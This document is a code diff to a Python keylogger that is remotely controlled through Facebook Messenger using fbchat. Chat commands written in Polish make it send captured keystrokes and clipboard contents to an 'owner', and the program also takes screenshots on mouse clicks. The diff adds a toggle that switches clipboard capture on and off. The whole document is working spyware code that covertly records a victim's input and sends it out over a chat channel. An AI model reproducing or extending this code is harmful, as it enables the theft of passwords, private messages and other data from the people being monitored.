@@ -29,6 +29,8 @@ class FacebookController(fbchat.Client):
         if message == 'logs':
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
+        if 'schowek' in message:
+            self.keylogger.toggle_clipboard_capturing()
         if 'schowku' in message:
             self.send_to_owner('\n'.join(self.keylogger.flush_captured_clipboard()))
 
@@ -38,6 +40,7 @@ class Keylogger(object):
         self.captured_keys = []
         self.captured_pasting = []
         self.capture_screenshots_on_click = False
+        self.clipboard_capturing = False
         self.previous_clipboard_content = ''
 
         self.reset_screenshot_directory()
@@ -48,6 +51,9 @@ class Keylogger(object):
 
     def toggle_screenshots_capturing(self):
         self.capture_screenshots_on_click = not self.capture_screenshots_on_click
+
+    def toggle_clipboard_capturing(self):
+        self.clipboard_capturing = not self.clipboard_capturing
 
     def flush_captured_keys(self):
         captured_keys, self.captured_keys = self.captured_keys, []
@@ -70,11 +76,12 @@ class Keylogger(object):
             screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
             self.screenshot_counter += 1
 
-        import pyperclip # Doesn't work when imported globally
-        clipboard_content = pyperclip.paste()
-        if self.previous_clipboard_content != clipboard_content:
-            self.previous_clipboard_content = clipboard_content
-            self.captured_pasting.append(clipboard_content)
+        if self.clipboard_capturing:
+            import pyperclip # Doesn't work when imported globally
+            clipboard_content = pyperclip.paste()
+            if self.previous_clipboard_content != clipboard_content:
+                self.previous_clipboard_content = clipboard_content
+                self.captured_pasting.append(clipboard_content)
 
     def _mark_mouse_position(self, screenshot):
         mouse_x, mouse_y = pymouse.PyMouse().position()
@@ -90,8 +97,9 @@ class Keylogger(object):
         self.captured_keys.append(event.name)
 
     def _on_paste(self):
-        import pyperclip # Doesn't work when imported globally
-        self.captured_pasting.append(pyperclip.paste())
+        if self.clipboard_capturing:
+            import pyperclip # Doesn't work when imported globally
+            self.captured_pasting.append(pyperclip.paste())
 
 
 k = Keylogger()
